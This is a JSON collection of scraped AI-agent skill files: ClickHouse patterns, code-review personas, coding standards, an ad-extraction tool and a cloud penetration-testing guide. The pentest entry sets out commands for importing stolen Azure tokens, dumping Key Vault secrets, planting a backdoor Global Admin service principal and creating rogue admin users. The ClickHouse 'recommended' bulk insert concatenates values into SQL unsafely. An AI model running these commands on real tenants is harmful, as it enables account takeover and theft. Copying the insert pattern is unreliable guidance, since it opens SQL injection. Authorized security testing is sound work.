'2025-01-01'\n  AND market_id = 'market-123'\n  AND volume > 1000\nORDER BY date DESC\nLIMIT 100;\n\n-- ❌ BAD: Filter on non-indexed columns first\nSELECT *\nFROM markets_analytics\nWHERE volume > 1000\n  AND market_name LIKE '%election%'\n  AND date >= '2025-01-01';\n```\n\n### Aggregations\n\n```sql\n-- ✅ GOOD: Use ClickHouse-specific aggregation functions\nSELECT\n    toStartOfDay(created_at) AS day,\n    market_id,\n    sum(volume) AS total_volume,\n    count() AS total_trades,\n    uniq(trader_id) AS unique_traders,\n    avg(trade_size) AS avg_size\nFROM trades\nWHERE created_at >= today() - INTERVAL 7 DAY\nGROUP BY day, market_id\nORDER BY day DESC, total_volume DESC;\n\n-- ✅ Use quantile for percentiles (more efficient than percentile)\nSELECT\n    quantile(0.50)(trade_size) AS median,\n    quantile(0.95)(trade_size) AS p95,\n    quantile(0.99)(trade_size) AS p99\nFROM trades\nWHERE created_at >= now() - INTERVAL 1 HOUR;\n```\n\n### Window Functions\n\n```sql\n-- Calculate running totals\nSELECT\n    date,\n    market_id,\n    volume,\n    sum(volume) OVER (\n        PARTITION BY market_id\n        ORDER BY date\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS cumulative_volume\nFROM markets_analytics\nWHERE date >= today() - INTERVAL 30 DAY\nORDER BY market_id, date;\n```\n\n## Data Insertion Patterns\n\n### Bulk Insert (Recommended)\n\n```typescript\nimport { ClickHouse } from 'clickhouse'\n\nconst clickhouse = new ClickHouse({\n  url: process.env.CLICKHOUSE_URL,\n  port: 8123,\n  basicAuth: {\n    username: process.env.CLICKHOUSE_USER,\n    password: process.env.CLICKHOUSE_PASSWORD\n  }\n})\n\n// ✅ Batch insert (efficient)\nasync function bulkInsertTrades(trades: Trade[]) {\n  const values = trades.map(trade => `(\n    '${trade.id}',\n    '${trade.market_id}',\n    '${trade.user_id}',\n    ${trade.amount},\n    '${trade.timestamp.toISOString()}'\n  )`).join(',')\n\n  await clickhouse.query(`\n    INSERT INTO trades (id, market_id, user_id, amount, timestamp)\n    VALUES ${values}\n  `).toPromise()\n}\n\n// ❌ Individual inserts (slow)\nasync function insertTrade(trade: Trade) {\n  // Don't do this in a loop!\n  await clickhouse.query(`\n    INSERT INTO trades VALUES ('${trade.id}', ...)\n  `).toPromise()\n}\n```\n\n### Streaming Insert\n\n```typescript\n// For continuous data ingestion\nimport { createWriteStream } from 'fs'\nimport { pipeline } from 'stream/promises'\n\nasync function streamInserts() {\n  const stream = clickhouse.insert('trades').stream()\n\n  for await (const batch of dataSource) {\n    stream.write(batch)\n  }\n\n  await stream.end()\n}\n```\n\n## Materialized Views\n\n### Real-time Aggregations\n\n```sql\n-- Create materialized view for hourly stats\nCREATE MATERIALIZED VIEW market_stats_hourly_mv\nTO market_stats_hourly\nAS SELECT\n    toStartOfHour(timestamp) AS hour,\n    market_id,\n    sumState(amount) AS total_volume,\n    countState() AS total_trades,\n    uniqState(user_id) AS unique_users\nFROM trades\nGROUP BY hour, market_id;\n\n-- Query ",
      "tags": [
        "typescript",
        "ai",
        "design",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:20.542Z"
    },
    {
      "id": "antigravity-cloud-penetration-testing",
      "name": "Cloud Penetration Testing",
      "slug": "cloud-penetration-testing",
      "description": "This skill should be used when the user asks to \"perform cloud penetration testing\", \"assess Azure or AWS or GCP security\", \"enumerate cloud resources\", \"exploit cloud misconfigurations\", \"test O365 security\", \"extract secrets from cloud environments\", or \"audit cloud infrastructure\". It provides co",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cloud-penetration-testing",
      "content": "\n# Cloud Penetration Testing\n\n## Purpose\n\nConduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.\n\n## Prerequisites\n\n### Required Tools\n```bash\n# Azure tools\nInstall-Module -Name Az -AllowClobber -Force\nInstall-Module -Name MSOnline -Force\nInstall-Module -Name AzureAD -Force\n\n# AWS CLI\ncurl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\"\nunzip awscliv2.zip && sudo ./aws/install\n\n# GCP CLI\ncurl https://sdk.cloud.google.com | bash\ngcloud init\n\n# Additional tools\npip install scoutsuite pacu\n```\n\n### Required Knowledge\n- Cloud architecture fundamentals\n- Identity and Access Management (IAM)\n- API authentication mechanisms\n- DevOps and automation concepts\n\n### Required Access\n- Written authorization for testing\n- Test credentials or access tokens\n- Defined scope and rules of engagement\n\n## Outputs and Deliverables\n\n1. **Cloud Security Assessment Report** - Comprehensive findings and risk ratings\n2. **Resource Inventory** - Enumerated services, storage, and compute instances\n3. **Credential Findings** - Exposed secrets, keys, and misconfigurations\n4. **Remediation Recommendations** - Hardening guidance per platform\n\n## Core Workflow\n\n### Phase 1: Reconnaissance\n\nGather initial information about target cloud presence:\n\n```bash\n# Azure: Get federation info\ncurl \"https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1\"\n\n# Azure: Get Tenant ID\ncurl \"https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration\"\n\n# Enumerate cloud resources by company name\npython3 cloud_enum.py -k targetcompany\n\n# Check IP against cloud providers\ncat ips.txt | python3 ip2provider.py\n```\n\n### Phase 2: Azure Authentication\n\nAuthenticate to Azure environments:\n\n```powershell\n# Az PowerShell Module\nImport-Module Az\nConnect-AzAccount\n\n# With credentials (may bypass MFA)\n$credential = Get-Credential\nConnect-AzAccount -Credential $credential\n\n# Import stolen context\nImport-AzContext -Profile 'C:\\Temp\\StolenToken.json'\n\n# Export context for persistence\nSave-AzContext -Path C:\\Temp\\AzureAccessToken.json\n\n# MSOnline Module\nImport-Module MSOnline\nConnect-MsolService\n```\n\n### Phase 3: Azure Enumeration\n\nDiscover Azure resources and permissions:\n\n```powershell\n# List contexts and subscriptions\nGet-AzContext -ListAvailable\nGet-AzSubscription\n\n# Current user role assignments\nGet-AzRoleAssignment\n\n# List resources\nGet-AzResource\nGet-AzResourceGroup\n\n# Storage accounts\nGet-AzStorageAccount\n\n# Web applications\nGet-AzWebApp\n\n# SQL Servers and databases\nGet-AzSQLServer\nGet-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG\n\n# Virtual machines\nGet-AzVM\n$vm = Get-AzVM -Name \"VMName\"\n$vm.OSProfile\n\n# List all users\nGet-MSolUser -All\n\n# List all groups\nGet-MSolGroup -All\n\n# Global Admins\nGet-MsolRole -RoleName \"Company Administrator\"\nGet-MSolGroupMember -GroupObjectId $GUID\n\n# Service Principals\nGet-MsolServicePrincipal\n```\n\n### Phase 4: Azure Exploitation\n\nExploit Azure misconfigurations:\n\n```powershell\n# Search user attributes for passwords\n$users = Get-MsolUser -All\nforeach($user in $users){\n    $props = @()\n    $user | Get-Member | foreach-object{$props+=$_.Name}\n    foreach($prop in $props){\n        if($user.$prop -like \"*password*\"){\n            Write-Output (\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop)\n        }\n    }\n}\n\n# Execute commands on VMs\nInvoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1\n\n# Extract VM UserData\n$vms = Get-AzVM\n$vms.UserData\n\n# Dump Key Vault secrets\naz keyvault list --query '[].name' --output tsv\naz keyvault set-policy --name <vault> --upn <user> --secret-permissions get list\naz keyvault secret list --vault-name <vault> --query '[].id' --output tsv\naz keyvault secret show --id <URI>\n```\n\n### Phase 5: Azure Persistence\n\nEstablish persistence in Azure:\n\n```powershell\n# Create backdoor service principal\n$spn = New-AzAdServicePrincipal -DisplayName \"WebService\" -Role Owner\n$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)\n$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)\n\n# Add service principal to Global Admin\n$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>\n$role = Get-MsolRole -RoleName \"Company Administrator\"\nAdd-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId\n\n# Login as service principal\n$cred = Get-Credential  # AppID as username, secret as password\nConnect-AzAccount -Credential $cred -Tenant \"tenant-id\" -ServicePrincipal\n\n# Create new admin user via CLI\naz ad user create --display-name <name> --password <pass> --user-principal-name <upn>\n```\n\n###",
      "tags": [
        "python",
        "api",
        "ai",
        "automation",
        "workflow",
        "document",
        "security",
        "kubernetes",
        "aws",
        "gcp"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:36.495Z"
    },
    {
      "id": "openhands-code-review",
      "name": "Code Review",
      "slug": "code-review",
      "description": "PERSONA:",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/code-review.md",
      "content": "\nPERSONA:\nYou are an expert software engineer and code reviewer with deep experience in modern programming best practices, secure coding, and clean code principles.\n\nTASK:\nReview the code changes in this pull request or merge request, and provide actionable feedback to help the author improve code quality, maintainability, and security. DO NOT modify the code; only provide specific feedback.\n\nCONTEXT:\nYou have full context of the code being committed in the pull request or merge request, including the diff, surrounding files, and project structure. The code is written in a modern language and follows typical idioms and patterns for that language.\n\nROLE:\nAs an automated reviewer, your role is to analyze the code changes and produce structured comments, including line numbers, across the following scenarios:\n\nCODE REVIEW SCENARIOS:\n1. Style and Formatting\nCheck for:\n- Inconsistent indentation, spacing, or bracket usage\n- Unused imports or variables\n- Non-standard naming conventions\n- Missing or misformatted comments/docstrings\n- Violations of common language-specific style guides (e.g., PEP8, Google Style Guide)\n\n2. Clarity and Readability\nIdentify:\n- Overly complex or deeply nested logic\n- Functions doing too much (violating single responsibility)\n- Poor naming that obscures intent\n- Missing inline documentation for non-obvious logic\n\n3. Security and Common Bug Patterns\nWatch for:\n- Unsanitized user input (e.g., in SQL, shell, or web contexts)\n- Hardcoded secrets or credentials\n- Incorrect use of cryptographic libraries\n- Common pitfalls (null dereferencing, off-by-one errors, race conditions)\n\nINSTRUCTIONS FOR RESPONSE:\nGroup the feedback by the scenarios above.\n\nThen, for each issue you find:\n- Provide a line number or line range\n- Briefly explain why it's an issue\n- Suggest a concrete improvement\n\nUse the following structure in your output:\n[src/utils.py, Line 42] :hammer_and_wrench: Unused import: The 'os' module is imported but never used. Remove it to clean up the code.\n[src/database.py, Lines 78–85] :mag: Readability: This nested if-else block is hard to follow. Consider refactoring into smaller functions or using early returns.\n[src/auth.py, Line 102] :closed_lock_with_key: Security Risk: User input is directly concatenated into an SQL query. This could allow SQL injection. Use parameterized queries instead.\n\nREMEMBER, DO NOT MODIFY THE CODE. ONLY PROVIDE FEEDBACK IN YOUR RESPONSE.\n",
      "tags": [
        "shell",
        "pr",
        "code-review"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:28.140Z"
    },
    {
      "id": "antigravity-code-review-checklist",
      "name": "code-review-checklist",
      "slug": "code-review-checklist",
      "description": "Comprehensive checklist for conducting thorough code reviews covering functionality, security, performance, and maintainability",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/code-review-checklist",
      "content": "\n# Code Review Checklist\n\n## Overview\n\nProvide a systematic checklist for conducting thorough code reviews. This skill helps reviewers ensure code quality, catch bugs, identify security issues, and maintain consistency across the codebase.\n\n## When to Use This Skill\n\n- Use when reviewing pull requests\n- Use when conducting code audits\n- Use when establishing code review standards for a team\n- Use when training new developers on code review practices\n- Use when you want to ensure nothing is missed in reviews\n- Use when creating code review documentation\n\n## How It Works\n\n### Step 1: Understand the Context\n\nBefore reviewing code, I'll help you understand:\n- What problem does this code solve?\n- What are the requirements?\n- What files were changed and why?\n- Are there related issues or tickets?\n- What's the testing strategy?\n\n### Step 2: Review Functionality\n\nCheck if the code works correctly:\n- Does it solve the stated problem?\n- Are edge cases handled?\n- Is error handling appropriate?\n- Are there any logical errors?\n- Does it match the requirements?\n\n### Step 3: Review Code Quality\n\nAssess code maintainability:\n- Is the code readable and clear?\n- Are names descriptive?\n- Is it properly structured?\n- Are functions/methods focused?\n- Is there unnecessary complexity?\n\n### Step 4: Review Security\n\nCheck for security issues:\n- Are inputs validated?\n- Is sensitive data protected?\n- Are there SQL injection risks?\n- Is authentication/authorization correct?\n- Are dependencies secure?\n\n### Step 5: Review Performance\n\nLook for performance issues:\n- Are there unnecessary loops?\n- Is database access optimized?\n- Are there memory leaks?\n- Is caching used appropriately?\n- Are there N+1 query problems?\n\n### Step 6: Review Tests\n\nVerify test coverage:\n- Are there tests for new code?\n- Do tests cover edge cases?\n- Are tests meaningful?\n- Do all tests pass?\n- Is test coverage adequate?\n\n## Examples\n\n### Example 1: Functionality Review Checklist\n\n```markdown\n## Functionality Review\n\n### Requirements\n- [ ] Code solves the stated problem\n- [ ] All acceptance criteria are met\n- [ ] Edge cases are handled\n- [ ] Error cases are handled\n- [ ] User input is validated\n\n### Logic\n- [ ] No logical errors or bugs\n- [ ] Conditions are correct (no off-by-one errors)\n- [ ] Loops terminate correctly\n- [ ] Recursion has proper base cases\n- [ ] State management is correct\n\n### Error Handling\n- [ ] Errors are caught appropriately\n- [ ] Error messages are clear and helpful\n- [ ] Errors don't expose sensitive information\n- [ ] Failed operations are rolled back\n- [ ] Logging is appropriate\n\n### Example Issues to Catch:\n\n**❌ Bad - Missing validation:**\n\\`\\`\\`javascript\nfunction createUser(email, password) {\n  // No validation!\n  return db.users.create({ email, password });\n}\n\\`\\`\\`\n\n**✅ Good - Proper validation:**\n\\`\\`\\`javascript\nfunction createUser(email, password) {\n  if (!email || !isValidEmail(email)) {\n    throw new Error('Invalid email address');\n  }\n  if (!password || password.length < 8) {\n    throw new Error('Password must be at least 8 characters');\n  }\n  return db.users.create({ email, password });\n}\n\\`\\`\\`\n```\n\n### Example 2: Security Review Checklist\n\n```markdown\n## Security Review\n\n### Input Validation\n- [ ] All user inputs are validated\n- [ ] SQL injection is prevented (use parameterized queries)\n- [ ] XSS is prevented (escape output)\n- [ ] CSRF protection is in place\n- [ ] File uploads are validated (type, size, content)\n\n### Authentication & Authorization\n- [ ] Authentication is required where needed\n- [ ] Authorization checks are present\n- [ ] Passwords are hashed (never stored plain text)\n- [ ] Sessions are managed securely\n- [ ] Tokens expire appropriately\n\n### Data Protection\n- [ ] Sensitive data is encrypted\n- [ ] API keys are not hardcoded\n- [ ] Environment variables are used for secrets\n- [ ] Personal data follows privacy regulations\n- [ ] Database credentials are secure\n\n### Dependencies\n- [ ] No known vulnerable dependencies\n- [ ] Dependencies are up to date\n- [ ] Unnecessary dependencies are removed\n- [ ] Dependency versions are pinned\n\n### Example Issues to Catch:\n\n**❌ Bad - SQL injection risk:**\n\\`\\`\\`javascript\nconst query = \\`SELECT * FROM users WHERE email = '\\${email}'\\`;\ndb.query(query);\n\\`\\`\\`\n\n**✅ Good - Parameterized query:**\n\\`\\`\\`javascript\nconst query = 'SELECT * FROM users WHERE email = $1';\ndb.query(query, [email]);\n\\`\\`\\`\n\n**❌ Bad - Hardcoded secret:**\n\\`\\`\\`javascript\nconst API_KEY = 'sk_live_abc123xyz';\n\\`\\`\\`\n\n**✅ Good - Environment variable:**\n\\`\\`\\`javascript\nconst API_KEY = process.env.API_KEY;\nif (!API_KEY) {\n  throw new Error('API_KEY environment variable is required');\n}\n\\`\\`\\`\n```\n\n### Example 3: Code Quality Review Checklist\n\n```markdown\n## Code Quality Review\n\n### Readability\n- [ ] Code is easy to understand\n- [ ] Variable names are descriptive\n- [ ] Function names explain what they do\n- [ ] Complex logic has comments\n- [ ] Magic numbers are replaced with constants\n\n### Structure\n- [ ] Functions",
      "tags": [
        "javascript",
        "markdown",
        "api",
        "ai",
        "template",
        "document",
        "security",
        "stripe",
        "rag",
        "cro"
      ],
      "useCases": [
        "Use when reviewing pull requests",
        "Use when conducting code audits",
        "Use when establishing code review standards for a team",
        "Use when training new developers on code review practices",
        "Use when you want to ensure nothing is missed in reviews"
      ],
      "scrapedAt": "2026-01-26T13:17:38.475Z"
    },
    {
      "id": "openhands-codereview-roasted",
      "name": "Codereview Roasted",
      "slug": "codereview-roasted",
      "description": "PERSONA:",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/codereview-roasted.md",
      "content": "\nPERSONA:\nYou are a critical code reviewer with the engineering mindset of Linus Torvalds. Apply 30+ years of experience maintaining robust, scalable systems to analyze code quality risks and ensure solid technical foundations. You prioritize simplicity, pragmatism, and \"good taste\" over theoretical perfection.\n\nCORE PHILOSOPHY:\n1. **\"Good Taste\" - First Principle**: Look for elegant solutions that eliminate special cases rather than adding conditional checks. Good code has no edge cases.\n2. **\"Never Break Userspace\" - Iron Law**: Any change that breaks existing functionality is unacceptable, regardless of theoretical correctness.\n3. **Pragmatism**: Solve real problems, not imaginary ones. Reject over-engineering and \"theoretically perfect\" but practically complex solutions.\n4. **Simplicity Obsession**: If it needs more than 3 levels of indentation, it's broken and needs redesign.\n\nCRITICAL ANALYSIS FRAMEWORK:\n\nBefore reviewing, ask Linus's Three Questions:\n1. Is this solving a real problem or an imagined one?\n2. Is there a simpler way?\n3. What will this break?\n\nTASK:\nProvide brutally honest, technically rigorous feedback on code changes. Be direct and critical while remaining constructive. Focus on fundamental engineering principles over style preferences. DO NOT modify the code; only provide specific, actionable feedback.\n\nCODE REVIEW SCENARIOS:\n\n1. **Data Structure Analysis** (Highest Priority)\n\"Bad programmers worry about the code. Good programmers worry about data structures.\"\nCheck for:\n- Poor data structure choices that create unnecessary complexity\n- Data copying/transformation that could be eliminated\n- Unclear data ownership and flow\n- Missing abstractions that would simplify the logic\n- Data structures that force special case handling\n\n2. **Complexity and \"Good Taste\" Assessment**\n\"If you need more than 3 levels of indentation, you're screwed.\"\nIdentify:\n- Functions with >3 levels of nesting (immediate red flag)\n- Special cases that could be eliminated with better design\n- Functions doing multiple things (violating single responsibility)\n- Complex conditional logic that obscures the core algorithm\n- Code that could be 3 lines instead of 10\n\n3. **Pragmatic Problem Analysis**\n\"Theory and practice sometimes clash. Theory loses. Every single time.\"\nEvaluate:\n- Is this solving a problem that actually exists in production?\n- Does the solution's complexity match the problem's severity?\n- Are we over-engineering for theoretical edge cases?\n- Could this be solved with existing, simpler mechanisms?\n\n4. **Breaking Change Risk Assessment**\n\"We don't break user space!\"\nWatch for:\n- Changes that could break existing APIs or behavior\n- Modifications to public interfaces without deprecation\n- Assumptions about backward compatibility\n- Dependencies that could affect existing users\n\n5. **Security and Correctness** (Critical Issues Only)\nFocus on real security risks, not theoretical ones:\n- Actual input validation failures with exploit potential\n- Real privilege escalation or data exposure risks\n- Memory safety issues in unsafe languages\n- Concurrency bugs that cause data corruption\n\nCRITICAL REVIEW OUTPUT FORMAT:\n\nStart with a **Taste Rating**:\n🟢 **Good taste** - Elegant, simple solution\n🟡 **Acceptable** - Works but could be cleaner\n🔴 **Needs improvement** - Violates fundamental principles\n\nThen provide **Linus-Style Analysis**:\n\n**[CRITICAL ISSUES]** (Must fix - these break fundamental principles)\n- [src/core.py, Line X] **Data Structure**: Wrong choice creates unnecessary complexity\n- [src/handler.py, Line Y] **Complexity**: >3 levels of nesting - redesign required\n- [src/api.py, Line Z] **Breaking Change**: This will break existing functionality\n\n**[IMPROVEMENT OPPORTUNITIES]** (Should fix - violates good taste)\n- [src/utils.py, Line A] **Special Case**: Can be eliminated with better design\n- [src/processor.py, Line B] **Simplification**: These 10 lines can be 3\n- [src/feature.py, Line C] **Pragmatism**: Solving imaginary problem, focus on real issues\n\n**[STYLE NOTES]** (Minor - only mention if genuinely important)\n- [src/models.py, Line D] **Naming**: Unclear intent, affects maintainability\n\n**VERDICT:**\n✅ **Worth merging**: Core logic is sound, minor improvements suggested\n❌ **Needs rework**: Fundamental design issues must be addressed first\n\n**KEY INSIGHT:**\n[One sentence summary of the most important architectural observation]\n\nCOMMUNICATION STYLE:\n- Be direct and technically precise\n- Focus on engineering fundamentals, not personal preferences\n- Explain the \"why\" behind each criticism\n- Suggest concrete, actionable improvements\n- Prioritize issues that affect real users over theoretical concerns\n\nREMEMBER: DO NOT MODIFY THE CODE. PROVIDE CRITICAL BUT CONSTRUCTIVE FEEDBACK ONLY.\n",
      "tags": [
        "pr",
        "code-review",
        "memory",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:28.420Z"
    },
    {
      "id": "antigravity-codex-review",
      "name": "codex-review",
      "slug": "codex-review",
      "description": "Professional code review with auto CHANGELOG generation, integrated with Codex AI",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/codex-review",
      "content": "\n# codex-review\n\n## Overview\nProfessional code review with auto CHANGELOG generation, integrated with Codex AI\n\n## When to Use\n- When you want professional code review before commits\n- When you need automatic CHANGELOG generation\n- When reviewing large-scale refactoring\n\n## Installation\n```bash\nnpx skills add -g BenedictKing/codex-review\n```\n\n## Step-by-Step Guide\n1. Install the skill using the command above\n2. Ensure Codex CLI is installed\n3. Use `/codex-review` or natural language triggers\n\n## Examples\nSee [GitHub Repository](https://github.com/BenedictKing/codex-review) for examples.\n\n## Best Practices\n- Keep CHANGELOG.md in your project root\n- Use conventional commit messages\n\n## Troubleshooting\nSee the GitHub repository for troubleshooting guides.\n\n## Related Skills\n- context7-auto-research, tavily-web, exa-search, firecrawl-scraper\n",
      "tags": [
        "ai"
      ],
      "useCases": [
        "When you want professional code review before commits",
        "When you need automatic CHANGELOG generation",
        "When reviewing large-scale refactoring"
      ],
      "scrapedAt": "2026-01-26T13:17:39.700Z"
    },
    {
      "id": "antigravity-cc-skill-coding-standards",
      "name": "coding-standards",
      "slug": "cc-skill-coding-standards",
      "description": "Universal coding standards, best practices, and patterns for TypeScript, JavaScript, React, and Node.js development.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cc-skill-coding-standards",
      "content": "\n# Coding Standards & Best Practices\n\nUniversal coding standards applicable across all projects.\n\n## Code Quality Principles\n\n### 1. Readability First\n- Code is read more than written\n- Clear variable and function names\n- Self-documenting code preferred over comments\n- Consistent formatting\n\n### 2. KISS (Keep It Simple, Stupid)\n- Simplest solution that works\n- Avoid over-engineering\n- No premature optimization\n- Easy to understand > clever code\n\n### 3. DRY (Don't Repeat Yourself)\n- Extract common logic into functions\n- Create reusable components\n- Share utilities across modules\n- Avoid copy-paste programming\n\n### 4. YAGNI (You Aren't Gonna Need It)\n- Don't build features before they're needed\n- Avoid speculative generality\n- Add complexity only when required\n- Start simple, refactor when needed\n\n## TypeScript/JavaScript Standards\n\n### Variable Naming\n\n```typescript\n// ✅ GOOD: Descriptive names\nconst marketSearchQuery = 'election'\nconst isUserAuthenticated = true\nconst totalRevenue = 1000\n\n// ❌ BAD: Unclear names\nconst q = 'election'\nconst flag = true\nconst x = 1000\n```\n\n### Function Naming\n\n```typescript\n// ✅ GOOD: Verb-noun pattern\nasync function fetchMarketData(marketId: string) { }\nfunction calculateSimilarity(a: number[], b: number[]) { }\nfunction isValidEmail(email: string): boolean { }\n\n// ❌ BAD: Unclear or noun-only\nasync function market(id: string) { }\nfunction similarity(a, b) { }\nfunction email(e) { }\n```\n\n### Immutability Pattern (CRITICAL)\n\n```typescript\n// ✅ ALWAYS use spread operator\nconst updatedUser = {\n  ...user,\n  name: 'New Name'\n}\n\nconst updatedArray = [...items, newItem]\n\n// ❌ NEVER mutate directly\nuser.name = 'New Name'  // BAD\nitems.push(newItem)     // BAD\n```\n\n### Error Handling\n\n```typescript\n// ✅ GOOD: Comprehensive error handling\nasync function fetchData(url: string) {\n  try {\n    const response = await fetch(url)\n\n    if (!response.ok) {\n      throw new Error(`HTTP ${response.status}: ${response.statusText}`)\n    }\n\n    return await response.json()\n  } catch (error) {\n    console.error('Fetch failed:', error)\n    throw new Error('Failed to fetch data')\n  }\n}\n\n// ❌ BAD: No error handling\nasync function fetchData(url) {\n  const response = await fetch(url)\n  return response.json()\n}\n```\n\n### Async/Await Best Practices\n\n```typescript\n// ✅ GOOD: Parallel execution when possible\nconst [users, markets, stats] = await Promise.all([\n  fetchUsers(),\n  fetchMarkets(),\n  fetchStats()\n])\n\n// ❌ BAD: Sequential when unnecessary\nconst users = await fetchUsers()\nconst markets = await fetchMarkets()\nconst stats = await fetchStats()\n```\n\n### Type Safety\n\n```typescript\n// ✅ GOOD: Proper types\ninterface Market {\n  id: string\n  name: string\n  status: 'active' | 'resolved' | 'closed'\n  created_at: Date\n}\n\nfunction getMarket(id: string): Promise<Market> {\n  // Implementation\n}\n\n// ❌ BAD: Using 'any'\nfunction getMarket(id: any): Promise<any> {\n  // Implementation\n}\n```\n\n## React Best Practices\n\n### Component Structure\n\n```typescript\n// ✅ GOOD: Functional component with types\ninterface ButtonProps {\n  children: React.ReactNode\n  onClick: () => void\n  disabled?: boolean\n  variant?: 'primary' | 'secondary'\n}\n\nexport function Button({\n  children,\n  onClick,\n  disabled = false,\n  variant = 'primary'\n}: ButtonProps) {\n  return (\n    <button\n      onClick={onClick}\n      disabled={disabled}\n      className={`btn btn-${variant}`}\n    >\n      {children}\n    </button>\n  )\n}\n\n// ❌ BAD: No types, unclear structure\nexport function Button(props) {\n  return <button onClick={props.onClick}>{props.children}</button>\n}\n```\n\n### Custom Hooks\n\n```typescript\n// ✅ GOOD: Reusable custom hook\nexport function useDebounce<T>(value: T, delay: number): T {\n  const [debouncedValue, setDebouncedValue] = useState<T>(value)\n\n  useEffect(() => {\n    const handler = setTimeout(() => {\n      setDebouncedValue(value)\n    }, delay)\n\n    return () => clearTimeout(handler)\n  }, [value, delay])\n\n  return debouncedValue\n}\n\n// Usage\nconst debouncedQuery = useDebounce(searchQuery, 500)\n```\n\n### State Management\n\n```typescript\n// ✅ GOOD: Proper state updates\nconst [count, setCount] = useState(0)\n\n// Functional update for state based on previous state\nsetCount(prev => prev + 1)\n\n// ❌ BAD: Direct state reference\nsetCount(count + 1)  // Can be stale in async scenarios\n```\n\n### Conditional Rendering\n\n```typescript\n// ✅ GOOD: Clear conditional rendering\n{isLoading && <Spinner />}\n{error && <ErrorMessage error={error} />}\n{data && <DataDisplay data={data} />}\n\n// ❌ BAD: Ternary hell\n{isLoading ? <Spinner /> : error ? <ErrorMessage error={error} /> : data ? <DataDisplay data={data} /> : null}\n```\n\n## API Design Standards\n\n### REST API Conventions\n\n```\nGET    /api/markets              # List all markets\nGET    /api/markets/:id          # Get specific market\nPOST   /api/markets              # Create new market\nPUT    /api/markets/:id          # Update market (full)\nPATCH  /api/markets/:id          # Update market (partial)\nDELETE /api/markets/:id         ",
      "tags": [
        "javascript",
        "typescript",
        "react",
        "node",
        "api",
        "ai",
        "design",
        "document",
        "supabase",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:21.842Z"
    },
    {
      "id": "composio-competitive-ads-extractor",
      "name": "competitive-ads-extractor",
      "slug": "competitive-ads-extractor",
      "description": "Extracts and analyzes competitors' ads from ad libraries (Facebook, LinkedIn, etc.) to understand what messaging, problems, and creative approaches are working. Helps inspire and improve your own ad campaigns.",
      "category": "Business & Marketing",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/competitive-ads-extractor",
      "content": "\n# Competitive Ads Extractor\n\nThis skill extracts your competitors' ads from ad libraries and analyzes what's working—the problems they're highlighting, use cases they're targeting, and copy/creative that's resonating.\n\n## When to Use This Skill\n\n- Researching competitor ad strategies\n- Finding inspiration for your own ads\n- Understanding market positioning\n- Identifying successful ad patterns\n- Analyzing messaging that works\n- Discovering new use cases or pain points\n- Planning ad campaigns with proven concepts\n\n## What This Skill Does\n\n1. **Extracts Ads**: Scrapes ads from Facebook Ad Library, LinkedIn, etc.\n2. **Captures Screenshots**: Saves visual copies of all ads\n3. **Analyzes Messaging**: Identifies problems, use cases, and value props\n4. **Categorizes Ads**: Groups by theme, audience, or format\n5. **Identifies Patterns**: Finds common successful approaches\n6. **Provides Insights**: Explains why certain ads likely perform well\n\n## How to Use\n\n### Basic Extraction\n\n```\nExtract all current ads from [Competitor Name] on Facebook Ad Library\n```\n\n```\nScrape ads from [Company] and analyze their messaging\n```\n\n### Specific Analysis\n\n```\nGet all ads from [Competitor] focusing on their messaging \nabout [specific problem]. What pain points are they highlighting?\n```\n\n### Competitive Set\n\n```\nExtract ads from these 5 competitors: [list]. \nCompare their approaches and tell me what's working.\n```\n\n### Specific Platform\n\n```\nGet LinkedIn ads from [Competitor] and analyze their \nB2B positioning strategy\n```\n\n## Example\n\n**User**: \"Extract ads from Notion on Facebook Ad Library and tell me what messaging is working for them.\"\n\n**Process**:\n```\nAccessing Facebook Ad Library...\nSearching for: Notion\nFound: 23 active ads\n\nExtracting screenshots...\n[████████████████████] 100%\n\nSaved to: competitor-ads/notion/\n- ad-001-collaboration.png\n- ad-002-productivity.png\n- ad-003-templates.png\n...\n\nAnalyzing 